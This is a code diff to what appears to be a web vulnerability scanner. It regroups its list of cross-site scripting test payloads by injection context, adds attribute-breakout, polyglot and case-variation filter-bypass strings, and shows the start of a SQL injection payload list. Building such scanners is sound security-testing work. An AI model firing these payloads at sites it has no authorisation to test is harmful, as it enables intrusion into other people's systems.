@@ -488,22 +488,44 @@ Example: ["payload1", "payload2"]"""
         _ssti_marker = random.randint(10000, 99999)
         payloads = {
             "xss": [
+                # HTML body context — basic tag injection
                 '<script>alert(1)</script>',
                 '<img src=x onerror=alert(1)>',
                 '<svg onload=alert(1)>',
-                '"><script>alert(1)</script>',
-                "'-alert(1)-'",
-                '<img src=x onerror=alert`1`>',
                 '<svg/onload=alert(1)>',
+                '<img src=x onerror=alert`1`>',
                 '<dETAILS/oPEN/oNTOGGLE=alert(1)>',
-                '<body onpageshow=alert(1)>',
                 '<input onfocus=alert(1) autofocus>',
-                '<marquee onstart=alert(1)>',
+                '<body onpageshow=alert(1)>',
                 '<video><source onerror=alert(1)>',
                 '<audio src=x onerror=alert(1)>',
+                '<marquee onstart=alert(1)>',
+                # Attribute breakout — double quote context
+                '"><img src=x onerror=alert(1)>',
+                '"><svg/onload=alert(1)>',
+                '" onmouseover="alert(1)',
+                '" onfocus="alert(1)" autofocus="',
+                '"autofocus onfocus="alert(1)',
+                # Attribute breakout — single quote context
+                "'><img src=x onerror=alert(1)>",
+                "' onmouseover='alert(1)",
+                "' onfocus='alert(1)' autofocus='",
+                # JavaScript string breakout
+                "';alert(1)//",
+                '";alert(1)//',
+                '</script><script>alert(1)</script>',
+                "'-alert(1)-'",
+                # URL/href context
                 'javascript:alert(1)',
+                'javascript:alert(document.domain)',
+                # Polyglot — works across multiple contexts
+                '\'"--><svg/onload=alert(1)>//',
+                '"><img src=x onerror=alert(1)>\'><svg/onload=alert(1)>',
+                # Encoding tricks for WAF bypass
+                '<img src=x oNeRrOr=alert(1)>',
+                '<ScRiPt>alert(1)</ScRiPt>',
+                # Angular/template
                 '{{constructor.constructor("alert(1)")()}}',
-                '%3Cscript%3Ealert(1)%3C/script%3E',
             ],
             "sqli": [
                 "' OR '1'='1", "' OR 1=1--", "' UNION SELECT NULL--",
